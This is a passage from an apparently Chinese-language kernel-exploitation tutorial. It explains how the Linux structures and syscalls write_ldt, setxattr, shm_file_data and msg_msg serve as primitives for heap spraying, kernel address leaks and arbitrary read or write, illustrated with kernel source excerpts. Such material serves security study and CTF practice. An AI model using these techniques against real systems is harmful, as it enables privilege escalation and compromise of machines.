class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span> <span class="title">ldt_info</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span> <span class="title">ldt</span>;</span></span><br><span class="line"><span class="type">int</span> error;</span><br><span class="line"></span><br><span class="line">error = -EINVAL;</span><br><span class="line"><span class="keyword">if</span> (bytecount != <span class="keyword">sizeof</span>(ldt_info))</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">error = -EFAULT;</span><br><span class="line"><span class="keyword">if</span> (copy_from_user(&amp;ldt_info, ptr, <span class="keyword">sizeof</span>(ldt_info)))</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">error = -EINVAL;</span><br><span class="line"><span class="keyword">if</span> (ldt_info.entry_number &gt;= LDT_ENTRIES)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"><span class="keyword">if</span> (ldt_info.contents == <span class="number">3</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (oldmode)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"><span class="keyword">if</span> (ldt_info.seg_not_present == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((oldmode &amp;&amp; !ldt_info.base_addr &amp;&amp; !ldt_info.limit) ||</span><br><span class="line">    LDT_empty(&amp;ldt_info)) &#123;</span><br><span class="line"><span class="comment">/* The user wants to clear the entry. */</span></span><br><span class="line"><span class="built_in">memset</span>(&amp;ldt, <span class="number">0</span>, <span class="keyword">sizeof</span>(ldt));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (!IS_ENABLED(CONFIG_X86_16BIT) &amp;&amp; !ldt_info.seg_32bit) &#123;</span><br><span class="line">error = -EINVAL;</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fill_ldt(&amp;ldt, &amp;ldt_info);</span><br><span class="line"><span class="keyword">if</span> (oldmode)</span><br><span class="line">ldt.avl = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (down_write_killable(&amp;mm-&gt;context.ldt_usr_sem))</span><br><span class="line"><span class="keyword">return</span> -EINTR;</span><br><span class="line"></span><br><span class="line">old_ldt       = mm-&gt;context.ldt;</span><br><span class="line">old_nr_entries = old_ldt ? old_ldt-&gt;nr_entries : <span class="number">0</span>;</span><br><span class="line">new_nr_entries = max(ldt_info.entry_number + <span class="number">1</span>, old_nr_entries);</span><br><span class="line"></span><br><span class="line">error = -ENOMEM;</span><br><span class="line">new_ldt = alloc_ldt_struct(new_nr_entries);</span><br><span class="line"><span class="keyword">if</span> (!new_ldt)</span><br><span class="line"><span class="keyword">goto</span> out_unlock;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (old_ldt)</span><br><span class="line"><span class="built_in">memcpy</span>(new_ldt-&gt;entries, old_ldt-&gt;entries, old_nr_entries * LDT_ENTRY_SIZE);</span><br><span class="line"></span><br><span class="line">new_ldt-&gt;entries[ldt_info.entry_number] = ldt;</span><br><span class="line">finalize_ldt_struct(new_ldt);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If we are using PTI, map the new LDT into the userspace pagetables.</span></span><br><span class="line"><span class="comment"> * If there is already an LDT, use the other slot so that other CPUs</span></span><br><span class="line"><span class="comment"> * will continue to use the old LDT until install_ldt() switches</span></span><br><span class="line"><span class="comment"> * them over to the new LDT.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">error = map_ldt_struct(mm, new_ldt, old_ldt ? !old_ldt-&gt;slot : <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (error) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This only can fail for the first LDT setup. If an LDT is</span></span><br><span class="line"><span class="comment"> * already installed then the PTE page is already</span></span><br><span class="line"><span class="comment"> * populated. Mop up a half populated page table.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (!WARN_ON_ONCE(old_ldt))</span><br><span class="line">free_ldt_pgtables(mm);</span><br><span class="line">free_ldt_struct(new_ldt);</span><br><span class="line"><span class="keyword">goto</span> out_unlock;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">install_ldt(mm, new_ldt);</span><br><span class="line">unmap_ldt_struct(mm, old_ldt);</span><br><span class="line">free_ldt_struct(old_ldt);</span><br><span class="line">error = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">out_unlock:</span><br><span class="line">up_write(&amp;mm-&gt;context.ldt_usr_sem);</span><br><span class="line">out:</span><br><span class="line"><span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们主要关注</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">new_ldt = alloc_ldt_struct(new_nr_entries);</span><br><span class="line"><span class="keyword">if</span> (!new_ldt)</span><br><span class="line"><span class="keyword">goto</span> out_unlock;</span><br><span class="line"><span class="keyword">if</span> (old_ldt)</span><br><span class="line"><span class="built_in">memcpy</span>(new_ldt-&gt;entries, old_ldt-&gt;entries, old_nr_entries * LDT_ENTRY_SIZE);</span><br><span class="line">new_ldt-&gt;entries[ldt_info.entry_number] = ldt;</span><br></pre></td></tr></table></figure><p><code>new_ldt</code>是新申请出来的object,在alloc之后memcpy之前有一个窗口期,若是我么能够在这期间竞争修改<code>new_ldt-&gt;entries</code>,那么便能够做到任意写,不过这个窗口期比较短,实际运用成功率较低</p><p>但我们还可以注意到<code>new_ldt-&gt;entries[ldt_info.entry_number] = ldt;</code>这一句,memcpy函数拷贝的长度是<code>old_nr_entries * LDT_ENTRY_SIZE</code></p><p>这个数据量相对较大,那么如果能够在memcpy函数执行的过程中通过竞争修改<code>new_ldt-&gt;entries</code>,也能够做到小范围的任意写</p><p>至于任意写的值其实也并不是完全受我们控制,不过可以根据我们传入的结构体,在一定程度上进行控制(具体可以看这个函数的完整流程)</p><p>我们<u>需要传入的结构体</u>的定义如下,新的ldt一定程度上受这个结构体控制,可以根据要求更改</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Note on 64bit base and limit is ignored and you cannot set DS/ES/CS</span></span><br><span class="line"><span class="comment"> * not to the default values if you still want to do syscalls. This</span></span><br><span class="line"><span class="comment"> * call is more for 32bit mode therefore.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span> &#123;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>  entry_number;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>  base_addr;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>  limit;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>  seg_32bit:<span class="number">1</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>  contents:<span class="number">2</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>  read_exec_only:<span class="number">1</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>  limit_in_pages:<span class="number">1</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>  seg_not_present:<span class="number">1</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>  useable:<span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __x86_64__</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Because this bit is not present in 32-bit user code, user</span></span><br><span class="line"><span class="comment"> * programs can pass uninitialized values here.  Therefore, in</span></span><br><span class="line"><span class="comment"> * any context in which a user_desc comes from a 32-bit program,</span></span><br><span class="line"><span class="comment"> * the kernel must act as though lm == 0, regardless of the</span></span><br><span class="line"><span class="comment"> * actual value.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>  lm:<span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="setxattr"><a href="#setxattr" class="headerlink" title="setxattr"></a>setxattr</h2><p><strong>申请obj大小:任意</strong></p><p><strong>GFP_KERNEL_ACCOUNT:否</strong></p><p><strong>功能:堆占位</strong></p><p>观察 setxattr 源码，发现如下调用链：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SYS_setxattr()</span><br><span class="line">    path_setxattr()</span><br><span class="line">        setxattr()</span><br></pre></td></tr></table></figure><p>在 <code>setxattr()</code> 函数中有如下逻辑：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">long</span></span><br><span class="line"><span class="title function_">setxattr</span><span class="params">(<span class="keyword">struct</span> dentry *d, <span class="type">const</span> <span class="type">char</span> __user *name, <span class="type">const</span> <span class="type">void</span> __user *value,</span></span><br><span class="line"><span class="params">     <span class="type">size_t</span> size, <span class="type">int</span> flags)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">        kvalue = kvmalloc(size, GFP_KERNEL);</span><br><span class="line">        <span class="keyword">if</span> (!kvalue)</span><br><span class="line">            <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">        <span class="keyword">if</span> (copy_from_user(kvalue, value, size)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//,..</span></span><br><span class="line"></span><br><span class="line">    kvfree(kvalue);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的 value 和 size 都是由我们来指定的，即<strong>我们可以分配任意大小的 object 并向其中写入内容，之后该对象会被释放掉</strong></p><p>使用时按照以下格式,其中第一个字符串需要是本进程的文件路径,第二个字符串任意</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setxattr(<span class="string">&quot;/tmp/exp&quot;</span>, <span class="string">&quot;abcdefg&quot;</span>, &amp;buf,len,<span class="number">0</span>);</span><br></pre></td></tr></table></figure><p><strong>通常需要配合 userfaultfd 系统调用</strong>完成进一步的利用</p><h2 id="shm-file-data"><a href="#shm-file-data" class="headerlink" title="shm_file_data"></a>shm_file_data</h2><p><strong>申请obj大小:32</strong></p><p><strong>GFP_KERNEL_ACCOUNT:否</strong></p><p><strong>功能:.text泄露</strong></p><p>这个结构体主要是用于泄露内核基址的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">shm_file_data</span> &#123;</span></span><br><span class="line"><span class="type">int</span> id;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ipc_namespace</span> *<span class="title">ns</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">vm_operations_struct</span> *<span class="title">vm_ops</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>大小为<code>0x20</code>,从kmalloc-32中分配</p><p>其中的 ns字段和vm_ops字段皆指向内核的<code>.text</code>段中</p><p>file字段位于内核线性映射区,能够泄露内核堆地址</p><p>有四个相关函数<code>shmget</code>、<code>shmat</code>、<code>shmctl</code>、<code>shmdt</code></p><h3 id="分配"><a href="#分配" class="headerlink" title="分配"></a>分配</h3><p>使用 <code>shmget</code> 系统调用可以获得一个共享内存对象，随后要使用 <code>shmat</code> 系统调用将共享内存对象映射到进程的地址空间</p><p><strong>shmget</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE3(shmget, <span class="type">key_t</span>, key, <span class="type">size_t</span>, size, <span class="type">int</span>, shmflg)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> ksys_shmget(key, size, shmflg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一般这样调用,key可以是任意整型,返回一个shmid</p><p><code>shm_id = shmget(114514, 0x1000, SHM_R | SHM_W | IPC_CREAT);</code></p><p><strong>shmat</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE3(shmat, <span class="type">int</span>, shmid, <span class="type">char</span> __user *, shmaddr, <span class="type">int</span>, shmflg)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> ret;</span><br><span class="line"><span class="type">long</span> err;</span><br><span class="line"></span><br><span class="line">err = do_shmat(shmid, shmaddr, shmflg, &amp;ret, SHMLBA);</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">force_successful_syscall_return();</span><br><span class="line"><span class="keyword">return</span> (<span class="type">long</span>)ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在do_shmat中会分配一个shm_file_data结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">do_shmat</span><span class="params">(<span class="type">int</span> shmid, <span class="type">char</span> __user *shmaddr, <span class="type">int</span> shmflg,</span></span><br><span class="line"><span class="params">          ulong *raddr, <span class="type">unsigned</span> <span class="type">long</span> shmlba)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">shm_file_data</span> *<span class="title">sfd</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    sfd = kzalloc(<span class="keyword">sizeof</span>(*sfd), GFP_KERNEL);</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">    file-&gt;private_data = sfd;</span><br></pre></td></tr></table></figure><h3 id="释放"><a href="#释放" class="headerlink" title="释放"></a>释放</h3><p><code>shmdt</code> 系统调用用以断开与共享内存对象的连接，观察其源码，发现其会调用 <code>ksys_shmdt()</code> 函数，注意到如下调用链：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SYS_shmdt()</span><br><span class="line">    ksys_shmdt()</span><br><span class="line">        do_munmap()</span><br><span class="line">            remove_vma_list()</span><br><span class="line">                remove_vma()</span><br></pre></td></tr></table></figure><p>其中有着这样一条代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> vm_area_struct *<span class="title function_">remove_vma</span><span class="params">(<span class="keyword">struct</span> vm_area_struct *vma)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">next</span> =</span> vma-&gt;vm_next;</span><br><span class="line"></span><br><span class="line">    might_sleep();</span><br><span class="line">    <span class="keyword">if</span> (vma-&gt;vm_ops &amp;&amp; vma-&gt;vm_ops-&gt;close)</span><br><span class="line">        vma-&gt;vm_ops-&gt;close(vma);</span><br><span class="line">    <span class="comment">//...</span></span><br></pre></td></tr></table></figure><p>在这里调用了该 vma 的 vm_ops 对应的 close 函数，我们将目光重新放回共享内存对应的 vma 的初始化的流程当中，在 shmat() 中注意到如下逻辑：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">do_shmat</span><span class="params">(<span class="type">int</span> shmid, <span class="type">char</span> __user *shmaddr, <span class="type">int</span> shmflg,</span></span><br><span class="line"><span class="params">          ulong *raddr, <span class="type">unsigned</span> <span class="type">long</span> shmlba)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">sfd = kzalloc(<span class="keyword">sizeof</span>(*sfd), GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> (!sfd) &#123;</span><br><span class="line">        fput(base);</span><br><span class="line">        <span class="keyword">goto</span> out_nattch;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    file = alloc_file_clone(base, f_flags,</span><br><span class="line">              is_file_hugepages(base) ?</span><br><span class="line">                &amp;shm_file_operations_huge :</span><br><span class="line">                &amp;shm_file_operations);</span><br></pre></td></tr></table></figure><p>在这里调用了 <code>alloc_file_clone()</code> 函数，其会调用 <code>alloc_file()</code> 函数将第三个参数赋值给新的 file 结构体的 f_op 域，在这里是 <code>shm_file_operations</code> 或 <code>shm_file_operations_huge</code>，定义于 <code>/ipc/shm.c</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">shm_file_operations</span> =</span> &#123;</span><br><span class="line">    .mmap        = shm_mmap,</span><br><span class="line">    .fsync        = shm_fsync,</span><br><span class="line">    .release    = shm_release,</span><br><span class="line">    .get_unmapped_area    = shm_get_unmapped_area,</span><br><span class="line">    .llseek        = noop_llseek,</span><br><span class="line">    .fallocate    = shm_fallocate,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * shm_file_operations_huge is now identical to shm_file_operations,</span></span><br><span class="line"><span class="comment"> * but we keep it distinct for the sake of is_file_shm_hugepages().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">shm_file_operations_huge</span> =</span> &#123;</span><br><span class="line">    .mmap        = shm_mmap,</span><br><span class="line">    .fsync        = shm_fsync,</span><br><span class="line">    .release    = shm_release,</span><br><span class="line">    .get_unmapped_area    = shm_get_unmapped_area,</span><br><span class="line">    .llseek        = noop_llseek,</span><br><span class="line">    .fallocate    = shm_fallocate,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在这里对于关闭 shm 文件，对应的是 <code>shm_release</code> 函数，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">shm_release</span><span class="params">(<span class="keyword">struct</span> inode *ino, <span class="keyword">struct</span> file *file)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">shm_file_data</span> *<span class="title">sfd</span> =</span> shm_file_data(file);</span><br><span class="line"></span><br><span class="line">    put_ipc_ns(sfd-&gt;ns);</span><br><span class="line">    fput(sfd-&gt;file);</span><br><span class="line">    shm_file_data(file) = <span class="literal">NULL</span>;</span><br><span class="line">    kfree(sfd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>即当我们进行 shmdt 系统调用时便可以释放 <code>shm_file_data</code> 结构体</p><h2 id="msg"><a href="#msg" class="headerlink" title="msg"></a>msg</h2><p><strong>申请obj大小:64-4k</strong></p><p><strong>GFP_KERNEL_ACCOUNT:是</strong></p><p><strong>功能:任意读|任意写|堆喷</strong></p><p>在 Linux kernel 中有着一组 system V 消息队列相关的系统调用：</p><ul><li>msgget：创建一个消息队列</li><li>msgsnd：向指定消息队列发送消息</li><li>msgrcv：从指定消息队列接接收消息</li></ul><p><strong>msgget</strong></p><p>其中msgget用于创建一个消息队列时</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">msgget</span><span class="params">(<span class="type">key_t</span> key, <span class="type">int</span> msgflag)</span></span><br></pre></td></tr></table></figure><ul><li>key:值为函数ftok的返回值或<code>IPC_PRIVATE</code>，若为<code>IPC_PRIVATE</code>则直接创建新的消息队列</li><li>msgflag:<code>IPC_CREAT</code>:创建新的消息队列。 <code>IPC_EXCL</code>:与<code>IPC_CREAT</code>一同使用，表示如果要创建的消息队列已经存在，则返回错误。(<code>IPC_EXCL</code>没有什么实质性的意义，但是可以帮我们确定是新建了消息队列而不是返回已经存在的消息队列) <code>IPC_NOWAIT</code>:读写消息队列要求无法满足时，不阻塞。返回值： 调用成功返回队列标识符,否则返回-1. 其中该参数需要配合权限控制符，例如<code>0666|IPC_CREAT</code></li></ul><p>在内核空间中会创建一个 <code>msg_queue</code> 结构体,其表示一个消息队列：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* one msq_queue structure for each present queue on the system */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kern_ipc_perm</span> <span class="title">q_perm</span>;</span></span><br><span class="line"><span class="type">time64_t</span> q_stime;<span class="comment">/* last msgsnd time */</span></span><br><span class="line"><span class="type">time64_t</span> q_rtime;<span class="comment">/* last msgrcv time */</span></span><br><span class="line"><span class="type">time64_t</span> q_ctime;<span class="comment">/* last change time */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> q_cbytes;<span class="comment">/* current number of bytes on queue */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> q_qnum;<span class="comment">/* number of messages in queue */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> q_qbytes;<span class="comment">/* max number of bytes on queue */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">q_lspid</span>;</span><span class="comment">/* pid of last msgsnd */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">q_lrpid</span>;</span><span class="comment">/* last receive pid */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_messages</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_receivers</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_senders</span>;</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><p><strong>msgsnd</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">msgsnd</span><span class="params">(<span class="type">int</span> msqid, <span class="type">const</span> <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">int</span> msgflg)</span></span><br></pre></td></tr></table></figure><ul><li>msqid:队列标识符</li><li>msgp:指向发送的消息,消息的前八个字节必须是msgtyp(值可以自定义),后面跟真正的消息</li><li>msgsz:真正的消息长度</li><li>msgflg:标志位<ul><li>0:消息队列满时,msgsnd阻塞直到消息能够写入消息队列</li><li>IPC_NOWAIT:消息队列满时不等待立即返回</li><li>IPC_NOERROR:若发送的消息长度大于msgsz,则截断</li></ul></li></ul><p>msgsnd 系统调用在指定消息队列上发送一条指定大小的 message 时，会建立<code>msg_msg</code>结构体。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* one msg_msg structure for each message */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line"><span class="type">long</span> m_type;</span><br><span class="line"><span class="type">size_t</span> m_ts;<span class="comment">/* message text size */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="type">void</span> *security;</span><br><span class="line"><span class="comment">/* the actual message follows immediately */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在内核当中这两个结构体形成一个如下结构的循环双向链表：</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/wjzFeZiDUpxXVKJ.png" alt=""></p><p>若是消息队列中只有一个消息则是这样:</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/sD9xtpaHrQ2uneZ.png" alt=""></p><p>虽然 <code>msg_queue</code> 的大小基本上是固定的，但是 <code>msg_msg</code> 作为承载消息的本体<strong>其大小是可以随着消息大小的改变而进行变动的</strong>，去除掉 msg_msg 结构体本身的 0x30 字节的部分（或许可以称之为 header）<strong>剩余的部分都用来存放用户数据</strong>，因此内核分配的 object 的大小是跟随着我们发送的 message 的大小进行变动的</p><p>而当我们单次发送<strong>大于【一个页面大小 - header size】</strong>大小的消息时，内核会额外补充添加 <code>msg_msgseg</code> 结构体，其与 <code>msg_msg</code> 之间形成如下单向链表结构：</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/5IcVxRaFQtg3HCW.png" alt=""></p><p>同样地，单个 <code>msg_msgseg</code> 的大小最大为一个页面大小，因此超出这个范围的消息内核会额外补充上更多的 <code>msg_msgseg</code> 结构体</p><p><strong>msgrcv</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">msgrcv</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp,<span class="type">int</span> 